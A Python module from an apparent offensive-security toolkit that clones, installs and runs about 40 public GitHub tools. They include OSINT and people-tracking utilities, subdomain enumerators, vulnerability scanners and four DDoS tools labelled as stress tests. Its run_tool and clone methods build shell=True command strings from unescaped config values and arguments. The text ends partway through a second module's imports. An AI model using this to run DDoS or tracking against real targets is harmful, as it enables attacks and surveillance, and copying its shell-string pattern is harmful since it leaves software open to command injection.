# ==============================================================================
# PART 2 — REPO MANAGER
# Управление 40 GitHub-репозиториями CASC-ANAYS
# ==============================================================================
# Требует: part1_core.py (Colors, Logger, Config, Utils, ProgressBar, check_git)
# ==============================================================================

import os
import sys
import json
import time
import shutil
import subprocess
import threading
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed


# ==============================================================================
# РЕЕСТР РЕПОЗИТОРИЕВ (40 штук)
# ==============================================================================
DEFAULT_REPOS: Dict[str, Dict[str, Any]] = {

    # --------------------------------------------------------------------------
    # OSINT (12)
    # --------------------------------------------------------------------------
    "sherlock": {
        "url": "https://github.com/sherlock-project/sherlock.git",
        "branch": "master",
        "category": "osint",
        "lang": "python",
        "size_hint": "small",
        "desc": "Поиск username по соцсетям"
    },
    "whatsmyname": {
        "url": "https://github.com/WebBreacher/WhatsMyName.git",
        "branch": "main",
        "category": "osint",
        "lang": "json",
        "size_hint": "small",
        "desc": "База данных username → сайты"
    },
    "maigret": {
        "url": "https://github.com/soxoj/maigret.git",
        "branch": "main",
        "category": "osint",
        "lang": "python",
        "size_hint": "medium",
        "desc": "Поиск username по 3000+ сайтам"
    },
    "theharvester": {
        "url": "https://github.com/laramies/theHarvester.git",
        "branch": "master",
        "category": "osint",
        "lang": "python",
        "size_hint": "medium",
        "desc": "Сбор email, субдоменов, хостов"
    },
    "spiderfoot": {
        "url": "https://github.com/smicallef/spiderfoot.git",
        "branch": "master",
        "category": "osint",
        "lang": "python",
        "size_hint": "large",
        "desc": "Автоматизированная OSINT-разведка"
    },
    "ghunt": {
        "url": "https://github.com/mxrch/GHunt.git",
        "branch": "main",
        "category": "osint",
        "lang": "python",
        "size_hint": "small",
        "desc": "OSINT по Google-аккаунтам"
    },
    "photon": {
        "url": "https://github.com/s0md3v/Photon.git",
        "branch": "master",
        "category": "osint",
        "lang": "python",
        "size_hint": "small",
        "desc": "Быстрый краулер для OSINT"
    },
    "osintgram": {
        "url": "https://github.com/Datalux/Osintgram.git",
        "branch": "main",
        "category": "osint",
        "lang": "python",
        "size_hint": "small",
        "desc": "OSINT для Instagram"
    },
    "h8mail": {
        "url": "https://github.com/khast3x/h8mail.git",
        "branch": "master",
        "category": "osint",
        "lang": "python",
        "size_hint": "small",
        "desc": "Поиск утечек email"
    },
    "holehe": {
        "url": "https://github.com/megadose/holehe.git",
        "branch": "master",
        "category": "osint",
        "lang": "python",
        "size_hint": "small",
        "desc": "Проверка email на 120+ сайтах"
    },
    "trape": {
        "url": "https://github.com/jofpin/trape.git",
        "branch": "master",
        "category": "osint",
        "lang": "python",
        "size_hint": "medium",
        "desc": "Tracking и OSINT по людям"
    },
    "torbot": {
        "url": "https://github.com/DedSecInside/TorBot.git",
        "branch": "main",
        "category": "osint",
        "lang": "python",
        "size_hint": "small",
        "desc": "OSINT через Tor"
    },

    # --------------------------------------------------------------------------
    # ПОДДОМЕНЫ (9)
    # --------------------------------------------------------------------------
    "sublist3r": {
        "url": "https://github.com/aboul3la/Sublist3r.git",
        "branch": "master",
        "category": "subdomains",
        "lang": "python",
        "size_hint": "small",
        "desc": "Быстрый поиск поддоменов"
    },
    "amass": {
        "url": "https://github.com/owasp-amass/amass.git",
        "branch": "master",
        "category": "subdomains",
        "lang": "go",
        "size_hint": "large",
        "desc": "Мощный фреймворк для subdomain enum"
    },
    "subfinder": {
        "url": "https://github.com/projectdiscovery/subfinder.git",
        "branch": "main",
        "category": "subdomains",
        "lang": "go",
        "size_hint": "medium",
        "desc": "Пассивный поиск поддоменов"
    },
    "findomain": {
        "url": "https://github.com/Findomain/Findomain.git",
        "branch": "master",
        "category": "subdomains",
        "lang": "rust",
        "size_hint": "medium",
        "desc": "Быстрый subdomain enumerator"
    },
    "subcat": {
        "url": "https://github.com/duty1g/subcat.git",
        "branch": "main",
        "category": "subdomains",
        "lang": "python",
        "size_hint": "small",
        "desc": "Subdomain takeover checker"
    },
    "subdomain-enumerator": {
        "url": "https://github.com/ryuukhagetsu/subdomain-enumerator.git",
        "branch": "main",
        "category": "subdomains",
        "lang": "python",
        "size_hint": "small",
        "desc": "Простой subdomain enumerator"
    },
    "subdomain-enum-tool": {
        "url": "https://github.com/Sergios9494/subdomain-enum-tool.git",
        "branch": "main",
        "category": "subdomains",
        "lang": "python",
        "size_hint": "small",
        "desc": "Ещё один subdomain enum tool"
    },
    "dnsrecon": {
        "url": "https://github.com/darkoperator/dnsrecon.git",
        "branch": "master",
        "category": "subdomains",
        "lang": "python",
        "size_hint": "small",
        "desc": "DNS enumeration и разведка"
    },
    "certinfo": {
        "url": "https://github.com/rix4uni/certinfo.git",
        "branch": "main",
        "category": "subdomains",
        "lang": "python",
        "size_hint": "small",
        "desc": "Инфа из SSL-сертификатов"
    },

    # --------------------------------------------------------------------------
    # УЯЗВИМОСТИ (12)
    # --------------------------------------------------------------------------
    "nikto": {
        "url": "https://github.com/sullo/nikto.git",
        "branch": "master",
        "category": "vuln",
        "lang": "perl",
        "size_hint": "small",
        "desc": "Web server scanner"
    },
    "nuclei": {
        "url": "https://github.com/projectdiscovery/nuclei.git",
        "branch": "main",
        "category": "vuln",
        "lang": "go",
        "size_hint": "large",
        "desc": "Шаблонный сканер уязвимостей"
    },
    "web-vuln-scanner": {
        "url": "https://github.com/HoangZuzi-14/Web-Vulnerability-Scanner.git",
        "branch": "main",
        "category": "vuln",
        "lang": "python",
        "size_hint": "small",
        "desc": "Простой web vuln scanner"
    },
    "wpscan": {
        "url": "https://github.com/wpscanteam/wpscan.git",
        "branch": "master",
        "category": "vuln",
        "lang": "ruby",
        "size_hint": "medium",
        "desc": "WordPress scanner"
    },
    "joomscan": {
        "url": "https://github.com/rezasp/joomscan.git",
        "branch": "master",
        "category": "vuln",
        "lang": "perl",
        "size_hint": "small",
        "desc": "Joomla scanner"
    },
    "cmsmap": {
        "url": "https://github.com/dionach/CMSmap.git",
        "branch": "master",
        "category": "vuln",
        "lang": "python",
        "size_hint": "small",
        "desc": "CMS scanner"
    },
    "cmseek": {
        "url": "https://github.com/Tuhinshubhra/CMSeeK.git",
        "branch": "master",
        "category": "vuln",
        "lang": "python",
        "size_hint": "small",
        "desc": "CMS detection и сканирование"
    },
    "cms-vuln-scanner": {
        "url": "https://github.com/Lordozer/cms-scanner.git",
        "branch": "main",
        "category": "vuln",
        "lang": "python",
        "size_hint": "small",
        "desc": "Ещё один CMS scanner"
    },
    "jaeles": {
        "url": "https://github.com/jaeles-project/jaeles.git",
        "branch": "main",
        "category": "vuln",
        "lang": "go",
        "size_hint": "large",
        "desc": "Web app scanner на шаблонах"
    },
    "gitleaks": {
        "url": "https://github.com/gitleaks/gitleaks.git",
        "branch": "master",
        "category": "vuln",
        "lang": "go",
        "size_hint": "medium",
        "desc": "Поиск секретов в git"
    },
    "trufflehog": {
        "url": "https://github.com/trufflesecurity/trufflehog.git",
        "branch": "main",
        "category": "vuln",
        "lang": "go",
        "size_hint": "large",
        "desc": "Поиск и верификация секретов"
    },
    "wordpress-plugins": {
        "url": "https://github.com/rix4uni/wordpress-plugins.git",
        "branch": "main",
        "category": "vuln",
        "lang": "python",
        "size_hint": "small",
        "desc": "WordPress plugin scanner"
    },

    # --------------------------------------------------------------------------
    # СТРЕСС-ТЕСТЫ (4)
    # --------------------------------------------------------------------------
    "floodles": {
        "url": "https://github.com/franckferman/Floodles.git",
        "branch": "main",
        "category": "stress",
        "lang": "python",
        "size_hint": "small",
        "desc": "L7 DDoS-инструмент"
    },
    "ddos-attack": {
        "url": "https://github.com/karthik558/ddos-attack.git",
        "branch": "main",
        "category": "stress",
        "lang": "python",
        "size_hint": "small",
        "desc": "Простой DDoS-скрипт"
    },
    "slowloris": {
        "url": "https://github.com/gkbrk/slowloris.git",
        "branch": "master",
        "category": "stress",
        "lang": "python",
        "size_hint": "small",
        "desc": "Slowloris-атака"
    },
    "goldeneye": {
        "url": "https://github.com/jseidl/GoldenEye.git",
        "branch": "master",
        "category": "stress",
        "lang": "python",
        "size_hint": "small",
        "desc": "HTTP DoS-инструмент"
    },

    # --------------------------------------------------------------------------
    # СЛОВАРИ (2)
    # --------------------------------------------------------------------------
    "seclists": {
        "url": "https://github.com/danielmiessler/SecLists.git",
        "branch": "master",
        "category": "wordlists",
        "lang": "text",
        "size_hint": "huge",
        "desc": "Огромная коллекция словарей (~1.5GB)",
        "skip_integrity": True,
        "shallow": False
    },
    "fuzzdb": {
        "url": "https://github.com/fuzzdb-project/fuzzdb.git",
        "branch": "master",
        "category": "wordlists",
        "lang": "text",
        "size_hint": "medium",
        "desc": "Словари для фаззинга"
    },

    # --------------------------------------------------------------------------
    # ВСПОМОГАТЕЛЬНЫЕ (1)
    # --------------------------------------------------------------------------
    "behindthecdn": {
        "url": "https://github.com/Neved4/behindTheCDN.git",
        "branch": "main",
        "category": "auxiliary",
        "lang": "python",
        "size_hint": "small",
        "desc": "Поиск реального IP за CDN"
    },
}


# ==============================================================================
# REPO MANAGER
# ==============================================================================
class RepoManager:
    """
    Управление 40 репозиториями CASC-ANAYS

    Возможности:
        - Клонирование (shallow clone, --depth 1)
        - Обновление (git pull)
        - Проверка целостности
        - Установка зависимостей (pip / npm / go)
        - Прогресс-бар
        - Параллельный режим
        - Статистика по размерам
        - Graceful shutdown
    """

    REPOS_DIR = "repos"
    CLONE_TIMEOUT = 600          # 10 минут на клон
    PULL_TIMEOUT = 120           # 2 минуты на pull
    INSTALL_TIMEOUT = 900        # 15 минут на установку зависимостей
    PARALLEL_WORKERS = 4         # одновременно клонируемых репо

    # Репозитории, которые НЕ клонируем без явного запроса (слишком тяжёлые)
    HEAVY_REPOS = {"seclists", "spiderfoot", "nuclei", "trufflehog", "amass"}

    def __init__(self, config: "Config", logger: "Logger",
                 base_dir: Optional[Path] = None):
        self.config = config
        self.logger = logger
        self.base_dir = Path(base_dir) if base_dir else (Path(__file__).parent / self.REPOS_DIR)
        self.base_dir.mkdir(parents=True, exist_ok=True)

        # Статусы репозиториев
        self.status: Dict[str, str] = {}
        self._status_lock = threading.Lock()

        # Загружаем репозитории: DEFAULT + из конфига
        self.repos: Dict[str, Dict[str, Any]] = dict(DEFAULT_REPOS)
        config_repos = config.get('repos', {}) or {}
        for name, data in config_repos.items():
            if isinstance(data, dict) and "url" in data:
                merged = dict(self.repos.get(name, {}))
                merged.update(data)
                self.repos[name] = merged

        # Проверяем git при инициализации
        self._git_ok = check_git()
        if not self._git_ok:
            self.logger.warning("git не найден — клонирование недоступно")

    # ==========================================================================
    # ВНУТРЕННИЕ ХЕЛПЕРЫ
    # ==========================================================================
    def _set_status(self, name: str, status: str):
        """Потокобезопасная установка статуса"""
        with self._status_lock:
            self.status[name] = status

    def _get_status(self, name: str) -> str:
        with self._status_lock:
            return self.status.get(name, "not_loaded")

    def _run_command(self, cmd: str, cwd: Optional[Path] = None,
                     timeout: int = 300) -> Tuple[bool, str, str]:
        """
        Выполняет shell-команду
        Возвращает: (success: bool, stdout: str, stderr: str)
        """
        try:
            result = subprocess.run(
                cmd,
                cwd=str(cwd) if cwd else None,
                capture_output=True,
                text=True,
                shell=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore',
            )
            return result.returncode == 0, result.stdout or "", result.stderr or ""
        except subprocess.TimeoutExpired:
            return False, "", f"Timeout ({timeout}s)"
        except FileNotFoundError as e:
            return False, "", f"Command not found: {e}"
        except Exception as e:
            return False, "", str(e)

    def _repo_path(self, name: str) -> Path:
        return self.base_dir / name

    def _repo_exists(self, name: str) -> bool:
        return self._repo_path(name).exists()

    def _is_heavy(self, name: str) -> bool:
        return name in self.HEAVY_REPOS

    def _get_repo_data(self, name: str) -> Dict[str, Any]:
        return self.repos.get(name, {})

    # ==========================================================================
    # КЛОНИРОВАНИЕ
    # ==========================================================================
    def clone_repo(self, name: str, url: Optional[str] = None,
                   branch: Optional[str] = None,
                   shallow: bool = True,
                   timeout: Optional[int] = None) -> bool:
        """
        Клонирует один репозиторий

        name     — имя (папка)
        url      — URL (если None — берётся из self.repos)
        branch   — ветка (если None — берётся из self.repos)
        shallow  — использовать --depth 1 (быстрее, но без истории)
        timeout  — таймаут в секундах
        """
        if not self._git_ok:
            self.logger.error(f"git недоступен, не могу клонировать {name}")
            self._set_status(name, "git_missing")
            return False

        data = self._get_repo_data(name)
        url = url or data.get('url', '')
        branch = branch or data.get('branch', 'master')
        timeout = timeout or self.CLONE_TIMEOUT

        if not url:
            self.logger.warning(f"Не указан URL для {name}")
            self._set_status(name, "no_url")
            return False

        target = self._repo_path(name)

        # Уже есть?
        if target.exists():
            self.logger.debug(f"{name}: уже существует")
            self._set_status(name, "exists")
            return True

        self.logger.info(f"Клонирование {name} ({branch})...")

        # Формируем команду
        depth_flag = "--depth 1 " if shallow else ""
        cmd = f'git clone {depth_flag}--branch "{branch}" --single-branch "{url}" "{target}"'

        start = time.time()
        ok, out, err = self._run_command(cmd, timeout=timeout)
        elapsed = time.time() - start

        if ok and target.exists():
            self._set_status(name, "cloned")
            self.logger.success(
                f"  {name}: клонирован за {Utils.format_duration(elapsed)}"
            )
            return True
        else:
            self._set_status(name, "error")
            self.logger.error(
                f"  {name}: ошибка клонирования — {Utils.truncate(err, 150)}"
            )
            # Убираем частичный клон
            if target.exists():
                try:
                    shutil.rmtree(target)
                except Exception:
                    pass
            return False

    # ==========================================================================
    # ОБНОВЛЕНИЕ
    # ==========================================================================
    def update_repo(self, name: str, timeout: Optional[int] = None) -> bool:
        """
        Обновляет репозиторий через git pull
        Если папки нет — клонирует
        """
        target = self._repo_path(name)
        timeout = timeout or self.PULL_TIMEOUT

        # Нет папки — клонируем
        if not target.exists():
            return self.clone_repo(name)

        # Нет .git — нечего пуллить, переклонируем
        if not (target / ".git").exists():
            self.logger.warning(f"{name}: нет .git, переклонирую")
            try:
                shutil.rmtree(target)
            except Exception:
                pass
            return self.clone_repo(name)

        self.logger.debug(f"Обновление {name}...")
        ok, out, err = self._run_command("git pull --ff-only", cwd=target, timeout=timeout)

        if ok:
            # Проверяем, были ли изменения
            if "Already up to date" in out or "Already up-to-date" in out:
                self._set_status(name, "up_to_date")
            else:
                self._set_status(name, "updated")
            return True
        else:
            self._set_status(name, "update_error")
            self.logger.warning(
                f"  {name}: ошибка обновления — {Utils.truncate(err, 150)}"
            )
            return False

    # ==========================================================================
    # ПРОВЕРКА ЦЕЛОСТНОСТИ
    # ==========================================================================
    def check_integrity(self, name: str) -> bool:
        """
        Проверяет, что репозиторий скачан корректно
        Ищет README, .git, файлы зависимостей
        """
        data = self._get_repo_data(name)
        if data.get('skip_integrity'):
            return True

        target = self._repo_path(name)

        # Нет папки — плохо
        if not target.exists():
            return False

        # Нет .git — подозрительно
        if not (target / ".git").exists():
            self.logger.warning(f"  {name}: нет .git")
            return False

        # Ищем признаки "живого" репо
        markers = [
            "README.md", "README.rst", "README.txt", "README",
            "requirements.txt", "setup.py", "pyproject.toml",
            "package.json", "go.mod", "Cargo.toml", "Gemfile",
            "LICENSE", "LICENSE.txt", "LICENSE.md",
        ]

        found = any((target / m).exists() for m in markers)

        if not found:
            # Может быть просто папка с данными (например, SecLists)
            # Проверяем, есть ли хоть какие-то файлы
            try:
                has_files = any(target.iterdir())
            except Exception:
                has_files = False

            if not has_files:
                self.logger.warning(f"  {name}: пустой репозиторий")
                return False

        return True

    def verify_all(self) -> Dict[str, bool]:
        """Проверяет целостность всех репозиториев"""
        self.logger.info("Проверка целостности репозиториев...")
        results = {}
        for name in self.repos.keys():
            results[name] = self.check_integrity(name)
        return results

    # ==========================================================================
    # УСТАНОВКА ЗАВИСИМОСТЕЙ
    # ==========================================================================
    def install_dependencies(self, name: str,
                             timeout: Optional[int] = None) -> bool:
        """
        Устанавливает зависимости репозитория
        Поддерживает: Python (requirements.txt, setup.py),
                      Node.js (package.json),
                      Go (go.mod),
                      Ruby (Gemfile)
        """
        target = self._repo_path(name)
        if not target.exists():
            return False

        timeout = timeout or self.INSTALL_TIMEOUT

        # Python
        if (target / "requirements.txt").exists():
            self.logger.info(f"  {name}: pip install -r requirements.txt")
            ok, _, err = self._run_command(
                f'"{sys.executable}" -m pip install -r requirements.txt',
                cwd=target,
                timeout=timeout
            )
            if not ok:
                self.logger.warning(f"  {name}: pip ошибка — {Utils.truncate(err, 150)}")
            return ok

        if (target / "pyproject.toml").exists() or (target / "setup.py").exists():
            self.logger.info(f"  {name}: pip install -e .")
            ok, _, err = self._run_command(
                f'"{sys.executable}" -m pip install -e .',
                cwd=target,
                timeout=timeout
            )
            if not ok:
                self.logger.debug(f"  {name}: pip -e ошибка — {Utils.truncate(err, 150)}")
            return ok

        # Node.js
        if (target / "package.json").exists():
            if not Utils.has_command("npm"):
                self.logger.warning(f"  {name}: npm не найден, пропускаю")
                return False
            self.logger.info(f"  {name}: npm install")
            ok, _, err = self._run_command("npm install", cwd=target, timeout=timeout)
            if not ok:
                self.logger.warning(f"  {name}: npm ошибка — {Utils.truncate(err, 150)}")
            return ok

        # Go
        if (target / "go.mod").exists():
            if not Utils.has_command("go"):
                self.logger.debug(f"  {name}: go не найден, пропускаю")
                return False
            self.logger.info(f"  {name}: go mod download")
            ok, _, err = self._run_command("go mod download", cwd=target, timeout=timeout)
            return ok

        # Ruby
        if (target / "Gemfile").exists():
            if not Utils.has_command("bundle"):
                self.logger.debug(f"  {name}: bundler не найден, пропускаю")
                return False
            self.logger.info(f"  {name}: bundle install")
            ok, _, err = self._run_command("bundle install", cwd=target, timeout=timeout)
            return ok

        self.logger.debug(f"  {name}: нет файла зависимостей")
        return True

    # ==========================================================================
    # ИНИЦИАЛИЗАЦИЯ ВСЕХ РЕПОЗИТОРИЕВ
    # ==========================================================================
    def init_all(self,
                 only: Optional[List[str]] = None,
                 skip_heavy: bool = True,
                 parallel: bool = False,
                 install_deps: bool = False,
                 check_integrity: bool = True) -> Dict[str, str]:
        """
        Инициализирует все репозитории

        only         — список имён (если None — все)
        skip_heavy   — пропускать тяжёлые (seclists, spiderfoot и т.д.)
        parallel     — параллельное клонирование
        install_deps — устанавливать зависимости
        check_integrity — проверять целостность
        """
        if not self._git_ok:
            self.logger.error("git недоступен — инициализация репозиториев невозможна")
            return self.status

        # Определяем список
        names = only if only else list(self.repos.keys())

        if skip_heavy and not only:
            skipped = [n for n in names if self._is_heavy(n)]
            names = [n for n in names if not self._is_heavy(n)]
            if skipped:
                self.logger.info(
                    f"Пропускаю тяжёлые репозитории ({len(skipped)}): "
                    f"{', '.join(skipped)}"
                )
                self.logger.info(
                    "  (используйте --init-repos --all, чтобы клонировать их тоже)"
                )

        total = len(names)
        self.logger.info(f"Инициализация {total} репозиториев...")
        start = time.time()

        if parallel and HAS_FUTURES:
            self._init_parallel(names, install_deps, check_integrity)
        else:
            self._init_sequential(names, install_deps, check_integrity)

        elapsed = time.time() - start
        self._print_init_summary(elapsed)
        return self.status

    def _init_sequential(self, names: List[str],
                         install_deps: bool, check_integrity: bool):
        """Последовательная инициализация с прогресс-баром"""
        total = len(names)
        with ProgressBar(total, prefix="Репозитории", color_func=Colors.light_purple) as pb:
            for i, name in enumerate(names, 1):
                if is_shutdown_requested():
                    self.logger.warning("Прерывание по Ctrl+C")
                    break
                self._process_one(name, install_deps, check_integrity)
                pb.update(i, name)

    def _init_parallel(self, names: List[str],
                       install_deps: bool, check_integrity: bool):
        """Параллельная инициализация"""
        total = len(names)
        done = 0
        lock = threading.Lock()

        def task(name: str):
            nonlocal done
            if is_shutdown_requested():
                return
            self._process_one(name, install_deps, check_integrity)
            with lock:
                done += 1
                print(f"\r  Прогресс: {done}/{total}  {name[:40]:40}", end="", flush=True)

        with ThreadPoolExecutor(max_workers=self.PARALLEL_WORKERS) as ex:
            futures = [ex.submit(task, n) for n in names]
            for _ in as_completed(futures):
                pass

        print()

    def _process_one(self, name: str, install_deps: bool, check_integrity: bool):
        """Обрабатывает один репозиторий: clone/update + опционально deps + integrity"""
        try:
            if self._repo_exists(name):
                self.update_repo(name)
            else:
                self.clone_repo(name)

            if install_deps:
                self.install_dependencies(name)

            if check_integrity:
                self.check_integrity(name)
        except Exception as e:
            self._set_status(name, "exception")
            self.logger.error(f"  {name}: исключение — {e}")

    def _print_init_summary(self, elapsed: float):
        """Выводит итоговую статистику инициализации"""
        stats = self.get_status_summary()
        print()
        self.logger.info("=" * 60)
        self.logger.info("ИТОГИ ИНИЦИАЛИЗАЦИИ")
        self.logger.info("=" * 60)
        self.logger.info(f"  Всего:      {stats['total']}")
        self.logger.success(f"  Клонировано:{stats['cloned']:>4}")
        self.logger.success(f"  Обновлено:  {stats['updated']:>4}")
        self.logger.info(f"  Уже было:   {stats['exists']:>4}")
        if stats['errors']:
            self.logger.error(f"  Ошибок:     {stats['errors']:>4}")
        self.logger.info(f"  Время:      {Utils.format_duration(elapsed)}")
        self.logger.info(f"  Размер:     {Utils.format_bytes(self.get_total_size())}")
        self.logger.info("=" * 60)

    # ==========================================================================
    # ПУБЛИЧНЫЕ МЕТОДЫ УПРАВЛЕНИЯ
    # ==========================================================================
    def get_repo_path(self, name: str) -> Optional[Path]:
        """Возвращает путь к репозиторию, если он существует"""
        p = self._repo_path(name)
        return p if p.exists() else None

    def get_repo_size(self, name: str) -> int:
        """Размер репозитория в байтах"""
        target = self._repo_path(name)
        if not target.exists():
            return 0
        return self._dir_size(target)

    def get_total_size(self) -> int:
        """Общий размер всех репозиториев"""
        if not self.base_dir.exists():
            return 0
        return self._dir_size(self.base_dir)

    def _dir_size(self, path: Path) -> int:
        """Рекурсивно считает размер директории"""
        total = 0
        try:
            for item in path.rglob('*'):
                if item.is_file():
                    try:
                        total += item.stat().st_size
                    except (OSError, FileNotFoundError):
                        pass
        except Exception:
            pass
        return total

    def list_repos(self) -> List[str]:
        """Возвращает список имён всех репозиториев"""
        return list(self.repos.keys())

    def list_downloaded(self) -> List[str]:
        """Возвращает список уже скачанных репозиториев"""
        return [n for n in self.repos.keys() if self._repo_exists(n)]

    def list_by_category(self) -> Dict[str, List[str]]:
        """Группирует репозитории по категориям"""
        result: Dict[str, List[str]] = {}
        for name, data in self.repos.items():
            cat = data.get('category', 'other')
            result.setdefault(cat, []).append(name)
        return result

    def get_status(self) -> Dict[str, str]:
        """Возвращает текущие статусы"""
        return dict(self.status)

    def get_status_summary(self) -> Dict[str, int]:
        """Возвращает сводку по статусам"""
        summary = {
            "total": len(self.repos),
            "cloned": 0,
            "updated": 0,
            "up_to_date": 0,
            "exists": 0,
            "errors": 0,
            "not_loaded": 0,
        }
        for name in self.repos.keys():
            st = self._get_status(name)
            if st in ("cloned",):
                summary["cloned"] += 1
            elif st in ("updated",):
                summary["updated"] += 1
            elif st in ("up_to_date",):
                summary["up_to_date"] += 1
            elif st in ("exists",):
                summary["exists"] += 1
            elif st in ("error", "update_error", "exception", "git_missing", "no_url"):
                summary["errors"] += 1
            else:
                summary["not_loaded"] += 1
        return summary

    def update_all(self, **kwargs) -> Dict[str, str]:
        """Алиас для init_all (обновление всех)"""
        return self.init_all(**kwargs)

    def clean(self, only: Optional[List[str]] = None) -> bool:
        """
        Удаляет репозитории
        only — список имён (если None — все)
        """
        try:
            if only:
                for name in only:
                    target = self._repo_path(name)
                    if target.exists():
                        shutil.rmtree(target)
                        self._set_status(name, "removed")
                        self.logger.info(f"Удалён: {name}")
            else:
                if self.base_dir.exists():
                    shutil.rmtree(self.base_dir)
                    self.base_dir.mkdir(parents=True, exist_ok=True)
                    self.status.clear()
                    self.logger.info("Все репозитории удалены")
            return True
        except Exception as e:
            self.logger.error(f"Ошибка удаления: {e}")
            return False

    def find_executable(self, name: str,
                        candidates: Optional[List[str]] = None) -> Optional[Path]:
        """
        Ищет исполняемый файл внутри репозитория
        Полезно для интеграции (например, nikto.pl, sublist3r.py)
        """
        target = self.get_repo_path(name)
        if not target:
            return None

        if candidates is None:
            candidates = [
                f"{name}.py", f"{name}.pl", f"{name}.rb",
                f"{name}.sh", name,
                "main.py", "run.py", "start.py",
                "nikto.pl", "sublist3r.py",
            ]

        for cand in candidates:
            # В корне
            p = target / cand
            if p.exists() and p.is_file():
                return p
            # В подпапках (глубина 2)
            for sub in target.iterdir():
                if sub.is_dir():
                    p = sub / cand
                    if p.exists() and p.is_file():
                        return p

        return None

    def has_repo(self, name: str) -> bool:
        """Проверяет, скачан ли репозиторий"""
        return self._repo_exists(name)

    def repo_info(self, name: str) -> Dict[str, Any]:
        """Возвращает полную информацию о репозитории"""
        data = dict(self._get_repo_data(name))
        data["name"] = name
        data["path"] = str(self._repo_path(name))
        data["exists"] = self._repo_exists(name)
        data["size"] = self.get_repo_size(name)
        data["size_str"] = Utils.format_bytes(data["size"])
        data["status"] = self._get_status(name)
        return data

    def all_info(self) -> List[Dict[str, Any]]:
        """Информация по всем репозиториям"""
        return [self.repo_info(n) for n in self.repos.keys()]

    # ==========================================================================
    # ИНФОРМАЦИОННЫЙ ВЫВОД
    # ==========================================================================
    def print_list(self, show_size: bool = True, show_status: bool = True,
                   group_by_category: bool = True):
        """Красиво выводит список репозиториев"""
        if group_by_category:
            grouped = self.list_by_category()
            for cat, names in sorted(grouped.items()):
                print(Colors.bold_purple(f"\n  [{cat.upper()}]"))
                for name in sorted(names):
                    self._print_repo_line(name, show_size, show_status)
        else:
            print(Colors.bold_purple("\n  [РЕПОЗИТОРИИ]"))
            for name in sorted(self.repos.keys()):
                self._print_repo_line(name, show_size, show_status)

    def _print_repo_line(self, name: str, show_size: bool, show_status: bool):
        parts = [f"    {Colors.cyan('•')} {name:32}"]

        if show_size:
            size = Utils.format_bytes(self.get_repo_size(name))
            parts.append(f"{size:>10}")

        if show_status:
            st = self._get_status(name)
            color = {
                "cloned": Colors.green,
                "updated": Colors.green,
                "up_to_date": Colors.green,
                "exists": Colors.cyan,
                "not_loaded": Colors.dim,
                "error": Colors.red,
                "update_error": Colors.red,
                "exception": Colors.red,
                "git_missing": Colors.red,
                "no_url": Colors.yellow,
            }.get(st, Colors.dim)
            parts.append(f"  {color(f'[{st}]')}")

        print(" ".join(parts))

    def print_status_table(self):
        """Выводит таблицу статусов всех репозиториев"""
        print(Colors.bold_purple("\n  СТАТУС РЕПОЗИТОРИЕВ"))
        print(Colors.dim("  " + "-" * 70))
        print(f"  {'Имя':<28} {'Категория':<14} {'Статус':<14} {'Размер'}")
        print(Colors.dim("  " + "-" * 70))

        for name in sorted(self.repos.keys()):
            data = self._get_repo_data(name)
            cat = data.get('category', '-')
            st = self._get_status(name)
            size = Utils.format_bytes(self.get_repo_size(name))

            color = {
                "cloned": Colors.green,
                "updated": Colors.green,
                "up_to_date": Colors.green,
                "exists": Colors.cyan,
            }.get(st, Colors.red if "error" in st else Colors.dim)

            print(f"  {name:<28} {cat:<14} {color(st):<24} {size}")

        print(Colors.dim("  " + "-" * 70))

    # ==========================================================================
    # ИНТЕГРАЦИЯ С МОДУЛЯМИ АНАЛИЗА
    # ==========================================================================
    def run_tool(self, name: str, args: List[str],
                 cwd: Optional[Path] = None,
                 timeout: int = 300) -> Tuple[bool, str, str]:
        """
        Запускает инструмент из репозитория
        Автоматически определяет интерпретатор по расширению
        """
        exe = self.find_executable(name)
        if not exe:
            return False, "", f"Не найден исполняемый файл для {name}"

        cwd = cwd or exe.parent
        cmd = self._build_command(exe, args)

        self.logger.debug(f"Запуск: {cmd}")
        return self._run_command(cmd, cwd=cwd, timeout=timeout)

    def _build_command(self, exe: Path, args: List[str]) -> str:
        """Собирает команду с правильным интерпретатором"""
        args_str = " ".join(f'"{a}"' if " " in a else a for a in args)
        ext = exe.suffix.lower()

        if ext == ".py":
            return f'"{sys.executable}" "{exe}" {args_str}'
        elif ext == ".pl":
            perl = Utils.which("perl") or "perl"
            return f'{perl} "{exe}" {args_str}'
        elif ext == ".rb":
            ruby = Utils.which("ruby") or "ruby"
            return f'{ruby} "{exe}" {args_str}'
        elif ext == ".sh":
            bash = Utils.which("bash") or "bash"
            return f'{bash} "{exe}" {args_str}'
        elif ext == ".go":
            go = Utils.which("go") or "go"
            return f'{go} run "{exe}" {args_str}'
        else:
            return f'"{exe}" {args_str}'

    # ==========================================================================
    # КОНТЕКСТНЫЙ МЕНЕДЖЕР (для with)
    # ==========================================================================
    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        # Ничего не чистим — репозитории должны остаться
        pass

    def __repr__(self):
        return f"<RepoManager repos={len(self.repos)} dir={self.base_dir}>"


# ==============================================================================
# ХЕЛПЕР: ИНИЦИАЛИЗАЦИЯ ИЗ КОНФИГА
# ==============================================================================
def create_repo_manager(config: "Config", logger: "Logger") -> RepoManager:
    """Удобная фабрика RepoManager"""
    return RepoManager(config, logger)


# ==============================================================================
# КОНЕЦ PART 2
# ==============================================================================
# В следующей части (part3_analysis.py):
#   - class PortScanner  (TCP + UDP, top-1000, async)
#   - class HTTPAnalyzer (заголовки, SSL, WAF, технологии, aiohttp)
#   - class DNSAnalyzer  (A/AAAA/MX/NS/TXT/CNAME/SOA/PTR)
#   - class OSINTModule  (WHOIS, DNS-history)
#   - class SubdomainModule (crt.sh + Sublist3r + amass + subfinder)
# ==============================================================================# ==============================================================================
# PART 3 — МОДУЛИ АНАЛИЗА
# Порты, HTTP, DNS, OSINT, Поддомены
# ==============================================================================
# Требует: part1_core.py, part2_repos.py
# ==============================================================================

import os
import re
import ssl
import json
import time
import socket
import asyncio
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed

# Мягкие импорты
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import dns.resolver
    import dns.exception
    import dns.reversename
